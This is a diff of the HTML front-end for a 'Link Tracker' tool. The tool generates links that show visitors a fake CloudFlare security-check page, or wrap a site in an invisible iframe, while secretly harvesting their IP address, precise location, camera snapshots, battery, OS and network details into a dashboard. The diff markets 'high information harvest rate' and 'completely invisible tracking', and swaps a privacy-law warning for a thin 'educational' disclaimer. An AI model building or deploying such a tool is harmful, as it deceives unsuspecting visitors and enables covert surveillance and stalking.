@@ -1,56 +1,52 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Link Tracker - Create Tracking Links</title>
+    <title>Link Tracker - Premium Data Collection</title>
     <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
+
 <body>
     <div class="container">
         <header class="header">
-            <h1>🔗 Link Tracker</h1>
-            <p class="subtitle">Create tracking links to gather information</p>
+            <h1><i class="fas fa-link"></i> Link Tracker</h1>
+            <p class="subtitle">Generate professional, secure tracking links with advanced analytics</p>
         </header>
 
         <div class="card">
             <div class="card-header">
-                <h2>Create New Tracking Link</h2>
+                <h2><i class="fas fa-plus-circle"></i> Create New Tracking Link</h2>
             </div>
             <div class="card-body">
                 <form id="createLinkForm">
                     <div class="form-group">
-                        <label for="userId">Your User ID (for tracking)</label>
-                        <input 
-                            type="text" 
-                            id="userId" 
-                            placeholder="Enter a unique identifier (e.g., user123)"
-                            required
-                        >
+                        <label for="userId">Your Tracking ID</label>
+                        <input type="text" id="userId" placeholder="e.g., campaign_summer_2024" required>
+                        <small>Share this ID only with those who need to view the dashboard</small>
                     </div>
 
                     <div class="form-group">
-                        <label for="targetUrl">Target URL</label>
-                        <input 
-                            type="url" 
-                            id="targetUrl" 
-                            placeholder="https://example.com"
-                            required
-                        >
-                        <small>Enter the URL where users will be redirected after data collection</small>
+                        <label for="targetUrl">Destination URL</label>
+                        <input type="url" id="targetUrl" placeholder="https://example.com/destination" required>
+                        <small>The final destination for your visitors</small>
                     </div>
 
-                    <button type="submit" class="btn btn-primary">
-                        Generate Tracking Links
+                    <button type="submit" class="btn btn-primary animated-gradient">
+                        <span>Generate Tracking Links</span>
+                        <div id="loader" class="spinner hidden" style="margin-left: 10px;"></div>
                     </button>
                 </form>
 
                 <div id="result" class="result hidden">
-                    <h3>✅ Links Created Successfully!</h3>
-                    
+                    <h3><i class="fas fa-check-circle"></i> Tracking Links Ready!</h3>
+
                     <div class="link-section">
-                        <h4>🌐 CloudFlare Page Link</h4>
-                        <p class="description">Shows a CloudFlare under attack page before redirect</p>
+                        <h4><i class="fab fa-cloudflare"></i> CloudFlare Security Link</h4>
+                        <p class="description">Displays a realistic security check page. High information harvest rate.
+                        </p>
                         <div class="link-box">
                             <input type="text" id="cloudflareLink" readonly>
                             <button class="btn-copy" onclick="copyToClipboard('cloudflareLink')">Copy</button>
@@ -59,8 +55,8 @@
                     </div>
 
                     <div class="link-section">
-                        <h4>🌐 WebView Page Link</h4>
-                        <p class="description">Shows the target website in an iframe</p>
+                        <h4><i class="fas fa-eye"></i> Webview Stealth Link</h4>
+                        <p class="description">Shows the target site in an iframe. Completely invisible tracking.</p>
                         <div class="link-box">
                             <input type="text" id="webviewLink" readonly>
                             <button class="btn-copy" onclick="copyToClipboard('webviewLink')">Copy</button>
@@ -70,87 +66,115 @@
 
                     <div class="dashboard-link">
                         <a id="dashboardLink" class="btn btn-secondary" target="_blank">
-                            📊 View Dashboard
+                            <i class="fas fa-chart-line"></i> Go to Analytics Dashboard
                         </a>
                     </div>
                 </div>
             </div>
         </div>
 
+        <div class="stats-card">
+            <h3><i class="fas fa-rocket"></i> Key Tracking Features</h3>
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <div class="stat-value"><i class="fas fa-map-marker-alt"></i></div>
+                    <div class="stat-label">Precise Location</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value"><i class="fas fa-camera"></i></div>
+                    <div class="stat-label">Multi-Snapshot</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value"><i class="fas fa-battery-full"></i></div>
+                    <div class="stat-label">Battery & OS</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value"><i class="fas fa-network-wired"></i></div>
+                    <div class="stat-label">Network Info</div>
+                </div>
+            </div>
+        </div>
+
         <div class="info-card">
-            <h3>ℹ️ How It Works</h3>
+            <h3><i class="fas fa-info-circle"></i> Deployment & Ethics</h3>
             <ul>
-                <li><strong>CloudFlare Link:</strong> Displays a CloudFlare verification page to collect information before redirecting</li>
-                <li><strong>WebView Link:</strong> Shows the target website in an iframe while collecting data in the background</li>
-                <li><strong>Data Collected:</strong> IP address, location, device info, browser details, and more</li>
-                <li><strong>Dashboard:</strong> View all collected data from your tracking links</li>
+                <li><strong>CloudFlare Method:</strong> Uses a 6-second verification delay to capture high-quality
+                    system data and locations.</li>
+                <li><strong>WebView Method:</strong> Immediately wraps the destination URL in an iframe for seamless
+                    user experience while tracking.</li>
+                <li><strong>Local vs Production:</strong> Ensure your <code>HOST_URL</code> is correctly set in
+                    environment variables.</li>
+                <li><strong>Ethical Note:</strong> This tool is for educational and authorized testing purposes only.
+                    Respect user privacy.</li>
             </ul>
         </div>
 
         <footer class="footer">
-            <p>⚠️ Use responsibly and ethically. Ensure compliance with privacy laws.</p>
+            <p><i class="fas fa-shield-alt"></i> Powered by Link Tracker Pro | Premium Tracking Interface</p>
         </footer>
     </div>
 
     <script>
         const form = document.getElementById('createLinkForm');
         const result = document.getElementById('result');
+        const loader = document.getElementById('loader');
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
-            
+
             const userId = document.getElementById('userId').value;
             const targetUrl = document.getElementById('targetUrl').value;
-            
+
             const btn = form.querySelector('button');
+            const btnText = btn.querySelector('span');
+
             btn.disabled = true;
-            btn.textContent = 'Generating...';
-            
+            btnText.textContent = 'Processing...';
+            loader.classList.remove('hidden');
+
             try {
                 const response = await fetch('/api/create-link', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ url: targetUrl, userId: userId })
                 });
-                
+
                 const data = await response.json();
-                
+
                 if (response.ok) {
                     document.getElementById('cloudflareLink').value = data.cloudflareLink;
                     document.getElementById('webviewLink').value = data.webviewLink;
                     document.getElementById('dashboardLink').href = `/dashboard/${userId}`;
-                    
-                    // Show shortened links if available
+
                     if (data.cloudflareShortLinks) {
                         const cloudflareShort = document.getElementById('cloudflareShort');
-                        cloudflareShort.innerHTML = '<h5>Shortened Links:</h5>' + 
-                            data.cloudflareShortLinks.map(link => 
+                        cloudflareShort.innerHTML = '<h5>Shortened Alternatives:</h5>' +
+                            data.cloudflareShortLinks.map(link =>
                                 `<div class="short-link"><a href="${link}" target="_blank">${link}</a></div>`
                             ).join('');
                         cloudflareShort.classList.remove('hidden');
                     }
-                    
+
                     if (data.webviewShortLinks) {
                         const webviewShort = document.getElementById('webviewShort');
-                        webviewShort.innerHTML = '<h5>Shortened Links:</h5>' + 
-                            data.webviewShortLinks.map(link => 
+                        webviewShort.innerHTML = '<h5>Shortened Alternatives:</h5>' +
+                            data.webviewShortLinks.map(link =>
                                 `<div class="short-link"><a href="${link}" target="_blank">${link}</a></div>`
                             ).join('');
                         webviewShort.classList.remove('hidden');
                     }
-                    
+
                     result.classList.remove('hidden');
                     result.scrollIntoView({ behavior: 'smooth' });
                 } else {
-                    alert(data.error || 'Error creating links');
+                    alert(data.error || 'Request failed');
                 }
             } catch (error) {
-                alert('Error: ' + error.message);
+                alert('Connection error: ' + error.message);
             } finally {
                 btn.disabled = false;
-                btn.textContent = 'Generate Tracking Links';
+                btnText.textContent = 'Generate Tracking Links';
+                loader.classList.add('hidden');
             }
         });
 
@@ -158,14 +182,18 @@
             const input = document.getElementById(elementId);
             input.select();
             document.execCommand('copy');
-            
+
             const btn = event.target;
             const originalText = btn.textContent;
             btn.textContent = 'Copied!';
+            btn.style.background = '#059669';
+
             setTimeout(() => {
                 btn.textContent = originalText;
+                btn.style.background = '#10b981';
             }, 2000);
         }
     </script>
 </body>
+
 </html>
